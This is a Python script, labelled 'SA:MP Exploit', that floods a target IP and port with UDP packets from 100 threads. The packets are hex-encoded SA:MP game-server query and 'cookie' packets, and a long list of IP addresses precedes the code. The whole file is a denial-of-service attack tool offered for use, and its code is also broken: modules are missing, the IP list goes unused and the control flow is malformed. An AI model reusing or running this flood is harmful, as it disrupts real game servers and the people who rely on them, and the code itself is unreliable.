import random
import time
import os
import requests
import sys

list_ip = [
"75.90.60.29",
"21.80.20.28",
"72.10.40.21",
"37.50.20.25",
"23.10.90.21",
"54.60.10.26",
"21.90.30.29",
"31.60.30.26",
"17.20.50.22",
"34.80.20.28",
"77.50.10.25",
"77.30.30.23",
"33.70.40.27",
"93.70.40.27",
"87.60.80.26",
"57.10.40.21",
"95.40.20.24",
"68.90.50.29",
"65.20.60.22",
"21.30.70.23",
"16.60.50.26",
"51.70.10.27",
"54.10.10.21",
"41.20.80.22",
"32.20.90.22",
"59.40.20.24",
"64.40.10.24",
"96.20.80.22",
"51.40.50.24",
"12.80.40.28",
"67.40.70.24",
"92.10.90.21",
"84.10.30.21",
"16.80.80.28",
"91.70.60.27",
"35.20.10.22",
"11.80.30.28",
"57.20.60.22",
"28.20.90.22",
"23.20.50.22",
"34.70.80.27",
"89.60.50.26",
"52.50.90.25",
"54.10.70.21",
"69.20.10.22",
"19.70.80.27",
"73.30.50.23",
"27.60.80.26",
"21.60.50.26",
"19.40.80.24",
"89.50.70.25",
"57.60.50.26",
"15.40.30.24",
"97.20.90.22",
"46.70.20.27",
"76.70.30.27",
"16.80.40.28",
"99.20.40.22",
"57.40.50.24",
"76.40.20.24",
"95.80.40.28",
"79.20.60.22",
"89.40.60.24",
"86.20.20.22",
"12.10.50.21",
"58.60.20.26",
"96.30.30.23",
"55.70.40.27",
"18.20.80.22",
"74.30.70.23",
"72.70.40.27",
"11.20.60.22",
"49.50.70.25",
"23.40.60.24",
"36.70.60.27",
"14.50.70.25",
"49.90.50.29",
"28.80.70.28",
"24.60.90.26",
"99.10.20.21",
"74.70.80.27",
"73.50.60.25",
"95.20.50.22",
"16.90.70.29",
"62.40.20.24",
"81.20.60.22",
"33.90.10.29",
"61.40.40.24",
"54.90.80.29",
"75.70.60.27",
"74.50.40.25",
"95.20.60.22",
"16.50.70.25",
"95.10.10.21",
"17.20.70.22",
"26.50.80.25",
"41.80.50.28",
"23.20.80.22",
"11.90.10.29",
"26.50.30.25",
"93.40.10.24",
"71.70.50.27",
"16.50.20.25",
"75.50.10.25",
"51.40.80.24",
"29.30.40.23",
"21.10.60.21",
"64.90.80.29",
"69.30.60.23",
"55.50.40.25",
"28.70.50.27",
"78.30.20.23",
"66.70.90.27",
"33.20.50.22",
"16.10.80.21",
"55.40.20.24",
"56.30.60.23",
"62.10.50.21",
"89.40.80.24",
"86.20.20.22",
"99.40.60.24",
"93.90.50.29",
"73.50.90.25",
"92.90.90.29",
"67.20.20.22",
"35.90.70.29",
"73.70.80.27",
"54.90.20.29",
"69.20.10.22",
"22.30.80.23",
"66.60.70.26",
"78.30.90.23",
"57.10.70.21",
"51.90.80.29",
"38.60.40.26",
"51.50.40.25",
"52.60.90.26",
"49.20.70.22",
"64.60.30.26",
"14.90.40.29",
"34.20.50.22",
"52.90.30.29",
"93.80.10.28",
"32.10.10.21",
"73.20.10.22",
"14.80.60.28",
"57.70.10.27",
"74.40.40.24",
"14.30.60.23",
"73.80.90.28",
"46.40.30.24",
"61.20.30.22",
"82.30.80.23",
"86.10.40.21",
"82.20.40.22",
"38.90.10.29",
"19.20.90.22",
"22.30.60.23",
"51.70.70.27",
"53.80.30.28",
"83.40.30.24",
"24.70.40.27",
"76.70.80.27",
"25.20.10.22",
"62.40.10.24",
"61.80.10.28",
"16.90.10.29",
"84.20.20.22",
"31.60.30.26",
"84.90.40.29",
"74.10.30.21",
"93.20.10.22",
"78.30.70.23",
"81.30.70.23",
"53.30.10.23",
"82.70.40.27",
"17.70.30.27",
"73.70.60.27",
"75.50.70.25",
"65.90.50.29",
"93.30.20.23",
"54.30.40.23",
"16.50.70.25",
"82.40.60.24",
"99.20.50.22",
"63.70.30.27",
"24.70.60.27",
"85.80.40.28",
"71.10.70.21",
"68.10.80.21",
"62.70.60.27",
"15.40.90.24",
"79.50.10.25",
"94.80.50.28",
"46.20.80.22",
"68.50.80.25",
"45.30.20.23",
"17.10.80.21",
"84.40.50.24",
"82.70.20.27",
"46.30.90.23",
"45.30.60.23",
"65.20.80.22",
"15.70.10.27",
"48.20.20.22",
"78.30.90.23",
"21.90.60.29",
"94.50.10.25",
"27.80.90.28",
"16.20.50.22",
"39.60.50.26",
"43.20.80.22",
"14.80.80.28",
"93.80.30.28",
"66.60.40.26",
"77.30.20.23",
"11.70.70.27",
"91.30.20.23",
"72.40.50.24",
"73.60.40.26",
"58.40.90.24",
"38.60.40.26",
"58.30.70.23",
"83.20.10.22",
"87.10.30.21",
"72.50.50.25",
"83.90.20.29",
"69.90.90.29",
"77.20.20.22",
"29.40.10.24",
"76.50.50.25",
"89.60.10.26",
"38.20.40.22",
"22.70.50.27",
"59.90.10.29",
"97.80.20.28",
"45.60.20.26",
"17.10.90.21",
"72.20.50.22",
"65.20.40.22",
"47.20.40.22",
"71.40.80.24",
"45.50.90.25",
"29.40.40.24",
"21.60.50.26",
"94.80.20.28",
"32.20.60.22",
"48.90.60.29",
"98.30.70.23",
"58.30.60.23",
"47.80.80.28",
"57.10.20.21",
"61.40.40.24",
"35.60.30.26",
"86.30.40.23",
"22.50.30.25",
"39.90.50.29",
"74.90.40.29",
"63.10.70.21",
"72.60.30.26",
"68.70.50.27",
"14.60.10.26",
"32.50.90.25",
"15.80.10.28",
"36.30.40.23",
"21.40.40.24",
"76.40.60.24",
"81.20.70.22",
"34.10.80.21",
"57.50.90.25",
"77.40.80.24",
"49.90.10.29",
"85.70.70.27",
"52.80.70.28",
"93.80.80.28",
"54.40.20.24",
"57.80.80.28",
"63.80.20.28",
"58.80.80.28",
"32.70.80.27",
"39.50.10.25",
"67.70.70.27",
"73.50.50.25",
"49.50.90.25",
"89.50.80.25",
"32.10.10.21",
"72.70.20.27",
"82.60.60.26",
"58.60.80.26",
"56.30.70.23",
"48.90.60.29",
"93.70.80.27",
"12.20.20.22",
"41.60.10.26",
"34.30.30.23",
"75.60.60.26",
"95.20.40.22",
"19.40.70.24",
"76.60.70.26",
"56.70.80.27",
"57.30.50.23",
"96.40.50.24",
"87.30.60.23",
"22.20.30.22",
"93.40.70.24",
"64.40.40.24",
"11.10.40.21",
"32.50.50.25",
"48.50.70.25",
"49.10.20.21",
"34.90.90.29",
"59.20.60.22",
"85.50.60.25",
"91.40.20.24",
"68.70.30.27",
"84.90.40.29",
"57.50.80.25",
"79.70.40.27",
"27.40.30.24",
"12.70.60.27",
"51.30.10.23",
"23.10.10.21",
"52.60.10.26",
"41.50.10.25",
"17.80.40.28",
"41.80.60.28",
"76.20.20.22",
"46.20.90.22",
"86.70.40.27",
"22.60.70.26",
"71.30.30.23",
"43.10.60.21",
"64.10.10.21",
"38.80.20.28",
"82.50.70.25",
"19.70.30.27",
"72.20.90.22",
"39.60.90.26",
"41.50.60.25",
"77.90.80.29",
"19.50.20.25",
"72.30.10.23",
"67.50.30.25",
"63.10.20.21",
"53.40.60.24",
"98.70.20.27",
"93.90.60.29",
"12.90.70.29",
"65.40.70.24",
"23.70.30.27",
"25.40.90.24",
"16.50.60.25",
"26.60.70.26",
"45.60.70.26",
"76.30.70.23",
"81.40.40.24",
"65.60.30.26",
"84.30.20.23",
"61.90.50.29",
"35.70.60.27",
"44.10.80.21",
"67.20.50.22",
"87.90.80.29",
"18.90.60.29",
"61.40.70.24",
"71.90.80.29",
"51.60.90.26",
"13.70.90.27",
"93.20.40.22",
"85.90.70.29",
"63.30.50.23",
"79.10.20.21",
"19.70.40.27",
"25.10.90.21",
"84.90.40.29",
"39.60.70.26",
"12.60.50.26",
"22.20.40.22",
"11.10.90.21",
"92.20.70.22",
"58.70.50.27",
"11.40.20.24",
"21.50.50.25",
"63.30.80.23",
"38.40.60.24",
"64.60.60.26",
"27.20.50.22",
"78.90.30.29",
"24.60.50.26",
"13.70.60.27",
"34.30.50.23",
"64.40.50.24",
"18.30.30.23",
"18.20.60.22",
"33.90.20.29",
"33.60.90.26",
"96.30.50.23",
"71.90.60.29",
"66.30.70.23",
"82.50.30.25",
"52.10.10.21",
"53.70.30.27",
"71.70.80.27",
"35.70.60.27",
"84.10.90.21",
"79.40.30.24",
"73.50.80.25",
"45.70.80.27",
"66.50.80.25",
"33.90.60.29",
"46.70.10.27",
"67.50.70.25",
"33.60.10.26",
"69.40.60.24",
"83.50.30.25",
"47.20.40.22",
"32.20.40.22",
"15.50.60.25",
"38.80.80.28",
"99.90.20.29",
"79.80.70.28",
"77.20.50.22",
"93.90.70.29",
"85.80.10.28",
"81.90.30.29",
"98.60.40.26",
"84.20.80.22",
"51.30.10.23",
"62.90.50.29",
"42.60.50.26",
"38.50.30.25",
"78.10.30.21",
"68.80.20.28",
"77.10.30.21",
"47.90.90.29",
"69.10.50.21",
"38.70.20.27",
"82.60.40.26",
"81.70.60.27",
"11.40.40.24",
"28.80.80.28",
"51.90.30.29",
"29.20.10.22",
"61.50.80.25",
"81.90.50.29",
"33.20.90.22",
"67.50.20.25",
"41.20.50.22",
"16.30.80.23",
"83.80.80.28",
"57.70.50.27",
"32.30.50.23",
"14.40.60.24",
"63.20.10.22",
"98.70.40.27",
"38.80.90.28",
"45.50.60.25",
"97.60.80.26",
"41.60.50.26",
"73.20.30.22",
"17.20.10.22",
"42.80.70.28",
"48.80.70.28",
"35.30.50.23",
"28.10.20.21",
"18.70.60.27",
"96.10.80.21",
"98.50.70.25",
"99.80.60.28",
"27.50.50.25",
"52.60.30.26",
"69.10.80.21",
"66.30.70.23",
"15.60.50.26",
"95.40.90.24",
"52.60.10.26",
"54.20.40.22",
"46.20.20.22",
"12.20.30.22",
"24.70.60.27",
"22.80.10.28",
"78.90.40.29",
"15.20.50.22",
"48.90.70.29",
"21.30.60.23",
"61.60.20.26",
"63.50.40.25",
"68.60.60.26",
"19.70.40.27",
"95.60.40.26",
"11.50.40.25",
"69.90.80.29",
"66.40.30.24",
"71.10.40.21",
"81.60.30.26",
"27.60.30.26",
"38.90.60.29",
"73.70.40.27",
"44.30.10.23",
"43.10.40.21",
"25.10.30.21",
"49.10.10.21",
"52.90.40.29",
"96.10.20.21",
"84.20.40.22",
"48.70.50.27",
"34.90.80.29",
"36.60.80.26",
"44.30.40.23",
"41.50.50.25",
"14.20.40.22",
"17.60.60.26",
"26.30.60.23",
"73.80.60.28",
"88.90.80.29",
"81.30.10.23",
"47.70.80.27",
"48.30.10.23",
"47.20.10.22",
"19.20.20.22",
"33.80.60.28",
"94.50.40.25",
"46.30.60.23",
"99.90.40.29",
"19.60.70.26",
"73.70.50.27",
"31.20.60.22",
"27.10.70.21",
"47.80.60.28",
"56.80.80.28",
"92.20.70.22",
"88.30.70.23",
"61.20.80.22",
"33.20.30.22",
"55.20.50.22",
"89.90.30.29",
"23.90.60.29",
"34.60.40.26",
"52.80.30.28",
"76.10.10.21",
"44.40.60.24",
"86.90.80.29",
"57.30.90.23",
"18.20.80.22",
"43.10.30.21",
"45.40.50.24",
"13.30.50.23",
"47.90.90.29",
"66.60.80.26",
"95.90.20.29",
"19.50.10.25",
"23.90.60.29",
"15.20.40.22",
"83.20.30.22",
"66.80.50.28",
"94.60.50.26",
"82.90.10.29",
"71.60.90.26",
"84.50.50.25",
"59.90.80.29",
"18.40.50.24",
"88.70.60.27",
"42.30.70.23",
"45.80.40.28",
"99.20.90.22",
"95.60.40.26",
"29.80.50.28",
"85.10.40.21",
"45.60.50.26",
"77.50.50.25",
"21.90.60.29",
"62.20.70.22",
"76.20.60.22",
"29.60.10.26",
"42.70.50.27",
"32.50.80.25",
"79.90.10.29",
"87.10.90.21",
"62.70.40.27",
"37.30.70.23",
"61.20.10.22",
"28.40.10.24",
"87.40.50.24",
"76.30.50.23",
"49.10.30.21",
"74.70.30.27",
"73.30.70.23",
"27.70.50.27",
"34.90.60.29",
"63.70.90.27",
"43.50.30.25",
"43.50.40.25",
"96.10.40.21",
"31.30.20.23",
"59.70.90.27",
"33.60.40.26",
"36.50.50.25",
"49.90.90.29",
"26.20.20.22",
"22.10.30.21",
"38.40.70.24",
"63.50.40.25",
"21.40.50.24",
"33.20.40.22",
"38.20.10.22",
"79.70.50.27",
"81.40.90.24",
"93.80.50.28",
"31.50.10.25",
"79.10.50.21",
"94.60.40.26",
"66.90.40.29",
"72.30.90.23",
"18.30.20.23",
"11.80.40.28",
"27.70.80.27",
"24.60.40.26",
"99.80.90.28",
"15.60.80.26",
"76.40.60.24",
"33.20.30.22",
"23.80.20.28",
"96.50.60.25",
"31.80.50.28",
"16.10.10.21",
"23.10.20.21",
"99.60.10.26",
"53.90.50.29",
"69.60.70.26",
"91.50.50.25",
"82.20.90.22",
"75.50.80.25",
"93.10.50.21",
"68.40.40.24",
"36.30.40.23",
"18.30.20.23",
"26.30.40.23",
"47.40.10.24",
"48.10.20.21",
"44.50.80.25",
"22.80.70.28",
"97.80.10.28",
"21.60.20.26",
"38.80.80.28",
"61.90.90.29",
"93.10.40.21",
"45.10.20.21",
"27.60.20.26",
"33.10.80.21",
"74.90.10.29",
"98.80.80.28",
"12.10.80.21",
"18.40.40.24",
"84.30.60.23",
"62.30.80.23",
"33.60.80.26",
"24.50.80.25",
"73.80.20.28",
"37.30.60.23",
"79.10.70.21",
"27.40.60.24",
"17.10.50.21",
"12.10.80.21",
"32.50.90.25",
"72.90.10.29",
"16.40.10.24",
"29.50.10.25",
"62.40.10.24",
"75.30.80.23",
"68.30.20.23",
"52.60.90.26",
"34.30.60.23",
"43.60.10.26",
"47.50.20.25",
"97.40.70.24",
"47.30.40.23",
"71.60.30.26",
"66.60.10.26",
"37.60.60.26",
"68.60.40.26",
"32.10.10.21",
"83.10.10.21",
"14.70.60.27",
"16.70.90.27",
"89.50.20.25",
"81.70.30.27",
"42.50.40.25",
"99.40.70.24",
"29.30.40.23",
"31.40.40.24",
"13.90.40.29",
"51.60.10.26",
"18.90.60.29",
"86.30.60.23",
"56.70.60.27",
"53.40.30.24",
"82.10.20.21",
"92.30.20.23",
"52.10.30.21",
"12.40.30.24",
"24.60.80.26",
"64.20.20.22",
"15.50.20.25",
"21.30.80.23",
"54.70.20.27",
"92.30.70.23",
"65.80.40.28",
"38.50.90.25",
"46.90.60.29",
"89.30.60.23",
"99.50.90.25",
"48.30.20.23",
"19.40.90.24",
"11.20.80.22",
"36.80.60.28",
"52.80.50.28",
"95.80.50.28",
"22.20.90.22",
"63.20.50.22",
"53.10.10.21",
"47.50.50.25",
"49.70.80.27",
"76.60.80.26",
"46.40.40.24",
"67.60.60.26",
"57.90.40.29",
"56.50.60.25",
"93.50.80.25",
"43.50.30.25",
"71.30.50.23",
"18.20.70.22",
"42.60.50.26",
"28.30.90.23",
"63.90.40.29",
"28.70.20.27",
"86.30.20.23",
"76.60.50.26",
"11.80.40.28",
"52.90.10.29",
"51.10.90.21",
"77.70.60.27",
"69.90.10.29",
"17.90.40.29",
"32.10.20.21",
"82.10.40.21",
"49.20.10.22",
"28.30.10.23",
"17.80.60.28",
"58.10.70.21",
"74.70.60.27",
"36.50.40.25",
"17.90.20.29",
"67.10.30.21",
"47.40.10.24",
"17.10.70.21",
"49.60.80.26",
"64.40.50.24",
"61.20.10.22",
"63.30.80.23",
"38.60.60.26",
"57.50.30.25",
"71.10.60.21",
"28.10.30.21",
"59.30.60.23",
"46.20.20.22",
"62.80.20.28",
"34.70.80.27",
"81.40.40.24",
"38.30.90.23",
"11.50.40.25",
"23.80.90.28",
"82.90.30.29",
"39.70.90.27",
"72.20.90.22",
"43.90.30.29",
"14.80.30.28",
"87.60.90.26",
"12.70.60.27",
"98.70.30.27",
"52.60.50.26",
"33.40.10.24",
"46.30.20.23",
"99.70.40.27",
"76.40.10.24",
"82.20.70.22",
"34.40.40.24",
"11.20.30.22",
"78.90.70.29",
"57.80.40.28",
"93.50.40.25",
"71.60.50.26",
"38.90.50.29",
"77.70.80.27",
"14.20.80.22",
"45.90.30.29",
"16.50.30.25",
"59.10.90.21",
"73.10.80.21",
"32.40.60.24",
"31.70.20.27",
"82.20.40.22",
"93.10.50.21",
"75.30.90.23",
"74.50.10.25",
"57.40.10.24",
"56.30.40.23",
"21.90.30.29",
"54.90.20.29",
"16.20.90.22",
"87.70.80.27",
"81.10.60.21",
"24.10.80.21",
"32.80.20.28",
"56.50.40.25",
"34.10.40.21",
"58.50.40.25",
"85.10.50.21",
"85.10.80.21",
"49.20.70.22",
"11.90.50.29",
"97.30.70.23",
"39.10.80.21",
"28.50.90.25",
"81.30.10.23",
"46.20.90.22",
"97.30.60.23",
"95.80.30.28",
"81.90.40.29",
"95.30.40.23",
"69.40.90.24",
"97.80.90.28",
"86.50.70.25",
"34.80.80.28",
"28.10.70.21",
"69.40.90.24",
"34.80.60.28",
"94.40.70.24",
"92.10.90.21",
"21.40.70.24",
"35.60.80.26",
"34.60.30.26",
"13.60.70.26",
"56.70.10.27",
"13.40.60.24",
"99.80.80.28",
"67.60.70.26",
"25.30.40.23",
"53.10.10.21",
"26.70.20.27",
"96.20.10.22",
"33.80.90.28",
"81.30.10.23",
"84.50.60.25",
"76.30.60.23",
"26.70.70.27",
"97.10.90.21",
"47.40.30.24",
"86.40.20.24",
"38.80.10.28",
"46.90.70.29",
"11.20.80.22",
"93.50.30.25",
"97.10.20.21",
"42.80.60.28",
"34.50.90.25",
"28.10.60.21",
"13.50.10.25",
"41.30.30.23",
"43.40.40.24",
"62.10.20.21",
"82.30.30.23",
"78.40.30.24",
"73.70.30.27",
"22.90.10.29",
"16.90.80.29",
"65.20.20.22",
"77.70.90.27",
"37.10.90.21",
"19.50.70.25",
"64.90.70.29",
"49.60.30.26",
"12.10.80.21",
"16.10.30.21",
"45.20.50.22",
"92.20.10.22",
"24.60.70.26",
"76.40.70.24",
"84.60.30.26",
"78.90.50.29",
"79.70.90.27",
"16.30.90.23",
"31.10.80.21",
"66.70.10.27",
"97.30.70.23",
"64.50.70.25",
"37.90.80.29",
"44.30.50.23",
"34.50.90.25",
"86.80.10.28",
"88.80.80.28",
"14.30.50.23",
"51.30.60.23",
"59.10.60.21",
"59.90.30.29",
"88.50.10.25",
"39.90.20.29",
"62.10.50.21",
"69.90.20.29",
"64.70.70.27",
"56.90.40.29",
"45.20.90.22",
"53.50.30.25",
"61.40.40.24",
"37.80.80.28",
"42.50.50.25",
"12.50.70.25",
"78.20.20.22",
"61.50.60.25",
"64.40.40.24",
"34.50.70.25",
"19.70.50.27",
"53.40.50.24",
"84.50.90.25",
"59.20.60.22",
"42.10.50.21",
"19.80.60.28",
"96.30.90.23",
"27.20.90.22",
"67.10.60.21",
"43.50.10.25",
"15.70.10.27",
"65.80.40.28",
"13.30.60.23",
"28.60.90.26",
"98.60.10.26",
"87.20.30.22",
"51.30.30.23",
"86.80.10.28",
"26.80.40.28",
"82.90.50.29",
"17.80.30.28",
"75.80.20.28",
"56.50.30.25",
"49.10.10.21",
"21.30.40.23",
"91.90.10.29",
"17.20.30.22",
"83.10.80.21",
"96.50.60.25",
"55.20.30.22",
"37.60.90.26",
"68.40.50.24",
"21.10.20.21",
"44.80.80.28",
"54.90.10.29",
"86.40.10.24",
"12.30.30.23",
"56.50.40.25",
"93.50.50.25",
"17.90.80.29",
"65.40.20.24",
"64.60.50.26",
"32.70.60.27",
"36.60.70.26",
"83.90.10.29",
"25.20.10.22",
"56.30.80.23",
"79.80.70.28",
"62.50.60.25",
"32.10.30.21",
"52.70.80.27",
"84.20.90.22",
"86.90.70.29",
"29.10.20.21",
"94.30.70.23",
"19.80.10.28",
"51.10.70.21",
"33.60.40.26",
"58.80.10.28",
"53.90.90.29",
"83.20.50.22",
"63.10.50.21",
"73.70.40.27",
"92.80.50.28",
"91.20.50.22",
"71.60.40.26",
"28.80.90.28",
"78.80.80.28",
"27.90.60.29",
"15.30.90.23",
"68.80.20.28",
"99.70.70.27",
"92.60.60.26",
"87.30.40.23",
"75.20.90.22",
"77.80.10.28",
"83.80.50.28",
"28.70.90.27",
"74.60.50.26",
"82.40.80.24",
"39.50.50.25",
"79.80.80.28",
"67.70.70.27",
"26.20.50.22",
"22.20.50.22",
"21.10.30.21",
"34.70.90.27",
"71.20.70.22",
"57.30.80.23",
"33.70.30.27",
"48.80.80.28",
"12.60.30.26",
"96.10.30.21",
"95.30.80.23",
"61.10.80.21",
"43.90.40.29",
"28.30.30.23",
"47.80.50.28",
"74.90.50.29",
"78.90.70.29",
"63.40.80.24",
"73.40.10.24",
"37.90.40.29",
"49.60.50.26",
"77.10.70.21",
"98.30.70.23",
"19.50.40.25",
"34.40.60.24",
"13.40.20.24",
"95.20.90.22",

]

def ddos():
  pass 
for ipadr in list_ip:
  ip = sys.argv[1]
  port = sys.argv[2]
  orgip = ip

  Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                         codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                         codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                         codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                         codecs.decode("081e62da","hex_codec"), #cookie port 7796
                         codecs.decode("081e77da","hex_codec"),#cookie port 7777
                         codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                         codecs.decode("021efd40","hex_codec"),#cookie port 7784
                         codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                         codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                         ]


  print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))







  class MyThread(threading.Thread):
       def run(self):
           while True:
                  sock = socket.socket(
                      socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP

                  msg = Pacotes[random.randrange(0,3)]

                  sock.sendto(msg, (ip, int(port)))


                  if(int(port) == 7777):
                      sock.sendto(Pacotes[5], (ip, int(port)))
                  elif(int(port) == 7796):
                      sock.sendto(Pacotes[4], (ip, int(port)))
                  elif(int(port) == 7771):
                      sock.sendto(Pacotes[6], (ip, int(port)))
                  elif(int(port) == 7784):
                      sock.sendto(Pacotes[7], (ip, int(port)))
                  elif(int(port) == 1111):
                      sock.sendto(Pacotes[9], (ip, int(port)))    


  if __name__ == '__main__':
      try:
       for x in range(100):                                    
              mythread = MyThread()  
              mythread.start()                                  
              time.sleep(.1)    
      except(KeyboardInterrupt):
           os.system('cls' if os.name == 'nt' else 'clear')

           print('#########################################################################')
           print('SA:MP Exploit')
           print('#########################################################################')
           print('\n\n')
           print('Ataque para ip {} foi parado'.format(orgip))
           continue

